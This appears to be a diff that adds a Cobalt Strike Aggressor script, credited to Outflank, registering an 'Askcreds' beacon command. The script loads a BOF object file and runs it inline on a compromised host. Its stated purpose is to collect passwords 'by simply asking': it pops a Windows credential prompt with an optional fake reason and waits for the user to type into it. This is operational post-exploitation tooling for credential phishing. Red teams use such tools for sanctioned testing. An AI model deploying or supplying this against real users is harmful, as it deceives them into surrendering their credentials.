@@ -1,0 +1,26 @@
+#author Cornelis de Plaa
+#@outflank.nl
+
+beacon_command_register("Askcreds", "Collect passwords using CredUIPromptForWindowsCredentialsName.",
+    "Synopsis: Askcreds [optional reason]\n\n" .
+    "Collect passwords by simply asking.\n");
+
+alias Askcreds {
+    $bid = $1;
+    $input = substr($0, 9);
+
+    # Read in the right BOF file
+    $handle = openf(script_resource("Askcreds." . barch($bid) . ".o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    blog($bid, "Askcreds BOF by Outflank, waiting max 60sec for user input...");
+    if ($input eq "") {
+        beacon_inline_execute($bid, $data, "go", $null);
+    }
+    else {
+        # Pack our arguments
+        $arg_data  = bof_pack($bid, "Z", $input);
+        beacon_inline_execute($bid, $data, "go", $arg_data);
+    }
+}
